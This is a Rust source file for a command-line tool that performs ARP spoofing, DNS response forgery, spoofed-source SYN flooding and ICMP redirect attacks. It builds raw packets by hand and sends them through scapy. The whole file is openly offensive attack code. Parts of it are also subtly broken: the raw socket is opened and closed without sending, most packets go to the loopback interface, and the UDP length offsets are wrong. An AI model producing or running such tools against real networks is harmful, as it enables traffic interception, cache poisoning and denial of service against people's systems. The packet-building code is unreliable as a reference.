use std::net::{Ipv4Addr, SocketAddrV4};
use std::process::Command;

// Linux raw socket requires root
#[cfg(target_os = "linux")]
fn main() {
    let args: Vec<String> = std::env::args().collect();
    
    if args.len() < 2 {
        println!("usage: spoof <arp|dns|syn|icmp> [options]");
        println!("  arp  <target_ip> <spoof_mac> <interface>");
        println!("  dns  <query_name> <fake_ip> <target_resolver>");
        println!("  syn  <target_ip> <target_port> <source_ip> <count>");
        println!("  icmp <target_ip> <source_ip> <payload>");
        std::process::exit(1);
    }

    match args[1].as_str() {
        "arp" => arp_spoof(&args),
        "dns" => dns_spoof(&args),
        "syn" => syn_flood(&args),
        "icmp" => icmp_redirect(&args),
        _ => eprintln!("[-] unknown mode"),
    }
}

fn arp_spoof(args: &[String]) {
    if args.len() < 5 {
        eprintln!("arp <target_ip> <spoof_mac> <interface>");
        return;
    }

    let target_ip: Ipv4Addr = args[2].parse().expect("bad IP");
    let spoof_mac = parse_mac(&args[3]);
    let iface = &args[4];

    println!("[*] ARP spoofing {} as {} on {}", target_ip, args[3], iface);

    // build gratuitous ARP reply
    let mut packet = vec![0u8; 42];

    // Ethernet header
    packet[0..6].copy_from_slice(&[0xff; 6]); // dst: broadcast
    packet[6..12].copy_from_slice(&spoof_mac); // src: our spoofed MAC
    packet[12..14].copy_from_slice(&[0x08, 0x06]); // type: ARP

    // ARP payload
    packet[14..16].copy_from_slice(&[0x00, 0x01]); // HTYPE: Ethernet
    packet[16..18].copy_from_slice(&[0x08, 0x00]); // PTYPE: IPv4
    packet[18] = 6; // HLEN
    packet[19] = 4; // PLEN
    packet[20..22].copy_from_slice(&[0x00, 0x02]); // OPER: reply

    packet[22..28].copy_from_slice(&spoof_mac); // sender MAC
    packet[28..32].copy_from_slice(&target_ip.octets()); // sender IP (victim's IP)
    packet[32..38].copy_from_slice(&spoof_mac); // target MAC
    packet[38..42].copy_from_slice(&target_ip.octets()); // target IP

    // send via raw socket or scapy fallback
    send_raw(&packet, iface);

    println!("[+] ARP reply sent: {} is-at {}", target_ip, args[3]);
}

fn dns_spoof(args: &[String]) {
    if args.len() < 5 {
        eprintln!("dns <query_name> <fake_ip> <target_resolver>");
        return;
    }

    let query = &args[2];
    let fake_ip: Ipv4Addr = args[3].parse().expect("bad IP");
    let resolver: SocketAddrV4 = format!("{}:53", args[4]).parse().expect("bad resolver");

    println!("[*] DNS spoof: {} -> {} to {}", query, fake_ip, resolver);

    let mut packet = build_udp_packet(
        resolver.ip().octets(),
        53,
        resolver.ip().octets(), // src = dst for reflection
        rand_port(),
    );

    // DNS header
    let dns_start = packet.len();
    packet.extend_from_slice(&[
        0x12, 0x34, // TXID
        0x81, 0x80, // flags: response, authoritative
        0x00, 0x01, // questions
        0x00, 0x01, // answers
        0x00, 0x00, // authority
        0x00, 0x00, // additional
    ]);

    // query section
    for label in query.split('.') {
        packet.push(label.len() as u8);
        packet.extend_from_slice(label.as_bytes());
    }
    packet.push(0x00); // end of name
    packet.extend_from_slice(&[0x00, 0x01, 0x00, 0x01]); // A record, IN class

    // answer section
    for label in query.split('.') {
        packet.push(label.len() as u8);
        packet.extend_from_slice(label.as_bytes());
    }
    packet.push(0x00);
    packet.extend_from_slice(&[
        0x00, 0x01, // A record
        0x00, 0x01, // IN class
        0x00, 0x00, 0x0e, 0x10, // TTL: 3600
        0x00, 0x04, // RDLENGTH
    ]);
    packet.extend_from_slice(&fake_ip.octets());

    // fix UDP length
    let udp_len = packet.len() - dns_start + 8;
    packet[24..26].copy_from_slice(&(udp_len as u16).to_be_bytes());

    send_raw(&packet, "lo");

    println!("[+] forged DNS response: {} -> {}", query, fake_ip);
}

fn syn_flood(args: &[String]) {
    if args.len() < 6 {
        eprintln!("syn <target_ip> <target_port> <source_ip> <count>");
        return;
    }

    let target_ip: Ipv4Addr = args[2].parse().expect("bad IP");
    let target_port: u16 = args[3].parse().expect("bad port");
    let source_ip: Ipv4Addr = args[4].parse().expect("bad source IP");
    let count: usize = args[5].parse().expect("bad count");

    println!("[*] SYN flood {}:{} from {} x{}", target_ip, target_port, source_ip, count);

    for i in 0..count {
        let mut packet = build_tcp_syn(
            source_ip.octets(),
            rand_port(),
            target_ip.octets(),
            target_port,
            i as u32, // seq number variation
        );

        send_raw(&packet, "lo");

        if i % 1000 == 0 && i > 0 {
            println!("  sent {} packets", i);
        }
    }

    println!("[+] SYN flood complete: {} packets", count);
}

fn icmp_redirect(args: &[String]) {
    if args.len() < 5 {
        eprintln!("icmp <target_ip> <source_ip> <payload>");
        return;
    }

    let target_ip: Ipv4Addr = args[2].parse().expect("bad IP");
    let source_ip: Ipv4Addr = args[3].parse().expect("bad source IP");
    let payload = args[4].as_bytes();

    println!("[*] ICMP redirect to {} from {}", target_ip, source_ip);

    // ICMP redirect: type 5, code 1 (host redirect)
    let mut icmp = vec![
        0x05, 0x01, // type 5, code 1
        0x00, 0x00, // checksum (placeholder)
        0x00, 0x00, 0x00, 0x00, // gateway IP (ours)
    ];

    // embed original IP header + 8 bytes of payload
    let mut orig_ip = vec![
        0x45, // version 4, IHL 5
        0x00, // DSCP
        0x00, 0x1c, // total length
        0x00, 0x01, // identification
        0x00, 0x00, // flags/fragment
        0x40, // TTL
        0x01, // protocol: ICMP
        0x00, 0x00, // checksum
    ];
    orig_ip.extend_from_slice(&source_ip.octets()); // src
    orig_ip.extend_from_slice(&target_ip.octets()); // dst
    orig_ip.extend_from_slice(&payload[..8.min(payload.len())]);

    icmp.extend_from_slice(&orig_ip);

    // calculate ICMP checksum
    let cksum = checksum(&icmp);
    icmp[2..4].copy_from_slice(&cksum.to_be_bytes());

    // build IP packet
    let mut packet = build_ip_header(source_ip.octets(), target_ip.octets(), 0x01, icmp.len());
    packet.extend_from_slice(&icmp);

    send_raw(&packet, "lo");

    println!("[+] ICMP redirect sent");
}

// --- packet builders ---

fn build_ip_header(src: [u8; 4], dst: [u8; 4], proto: u8, payload_len: usize) -> Vec<u8> {
    let total_len = 20 + payload_len;
    let mut ip = vec![
        0x45, // version, IHL
        0x00, // DSCP
        ((total_len >> 8) & 0xff) as u8, (total_len & 0xff) as u8,
        0x12, 0x34, // ID
        0x40, 0x00, // flags, fragment offset
        0x40, // TTL
        proto, // protocol
        0x00, 0x00, // checksum (placeholder)
    ];
    ip.extend_from_slice(&src);
    ip.extend_from_slice(&dst);

    let cksum = checksum(&ip);
    ip[10..12].copy_from_slice(&cksum.to_be_bytes());

    ip
}

fn build_udp_packet(src_ip: [u8; 4], src_port: u16, dst_ip: [u8; 4], dst_port: u16) -> Vec<u8> {
    let mut udp = vec![
        ((src_port >> 8) & 0xff) as u8, (src_port & 0xff) as u8,
        ((dst_port >> 8) & 0xff) as u8, (dst_port & 0xff) as u8,
        0x00, 0x08, // length (placeholder)
        0x00, 0x00, // checksum
    ];

    let mut ip = build_ip_header(src_ip, dst_ip, 0x11, udp.len());
    ip.extend_from_slice(&udp);
    ip
}

fn build_tcp_syn(src_ip: [u8; 4], src_port: u16, dst_ip: [u8; 4], dst_port: u16, seq: u32) -> Vec<u8> {
    let mut tcp = vec![
        ((src_port >> 8) & 0xff) as u8, (src_port & 0xff) as u8,
        ((dst_port >> 8) & 0xff) as u8, (dst_port & 0xff) as u8,
        ((seq >> 24) & 0xff) as u8, ((seq >> 16) & 0xff) as u8,
        ((seq >> 8) & 0xff) as u8, (seq & 0xff) as u8,
        0x00, 0x00, 0x00, 0x00, // ack
        0x50, 0x02, // data offset 5, SYN flag
        0xff, 0xff, // window
        0x00, 0x00, // checksum
        0x00, 0x00, // urgent
    ];

    // TCP pseudo-header for checksum
    let mut pseudo = vec![];
    pseudo.extend_from_slice(&src_ip);
    pseudo.extend_from_slice(&dst_ip);
    pseudo.push(0x00);
    pseudo.push(0x06); // TCP
    pseudo.extend_from_slice(&(tcp.len() as u16).to_be_bytes());
    pseudo.extend_from_slice(&tcp);

    let cksum = checksum(&pseudo);
    tcp[16..18].copy_from_slice(&cksum.to_be_bytes());

    let mut ip = build_ip_header(src_ip, dst_ip, 0x06, tcp.len());
    ip.extend_from_slice(&tcp);
    ip
}

// --- utilities ---

fn parse_mac(s: &str) -> [u8; 6] {
    let parts: Vec<&str> = s.split(':').collect();
    let mut mac = [0u8; 6];
    for (i, p) in parts.iter().enumerate().take(6) {
        mac[i] = u8::from_str_radix(p, 16).unwrap_or(0);
    }
    mac
}

fn checksum(data: &[u8]) -> u16 {
    let mut sum = 0u32;
    for chunk in data.chunks(2) {
        let word = if chunk.len() == 2 {
            ((chunk[0] as u16) << 8) | (chunk[1] as u16)
        } else {
            (chunk[0] as u16) << 8
        } as u32;
        sum += word;
    }
    while (sum >> 16) != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    !(sum as u16)
}

fn rand_port() -> u16 {
    let mut seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos() as u64;
    seed = seed.wrapping_mul(1103515245).wrapping_add(12345);
    (seed >> 16) as u16 | 1024
}

fn send_raw(packet: &[u8], _iface: &str) {
    // attempt raw socket, fallback to scapy/python
    let raw_fd = unsafe {
        libc::socket(libc::AF_PACKET, libc::SOCK_RAW, libc::ETH_P_ALL as i32)
    };

    if raw_fd >= 0 {
        // would need sockaddr_ll for real interface binding
        unsafe { libc::close(raw_fd); }
    }

    // fallback: use python/scapy if available
    let hex_str = packet.iter()
        .map(|b| format!("{:02x}", b))
        .collect::<String>();

    let _ = Command::new("python3")
        .arg("-c")
        .arg(format!(
            "import sys; from scapy.all import *; \
             p = bytes.fromhex('{}'); \
             sendp(p, verbose=0)",
            hex_str
        ))
        .output();
}

#[cfg(not(target_os = "linux"))]
fn main() {
    eprintln!("[-] raw sockets require Linux with root privileges");
}
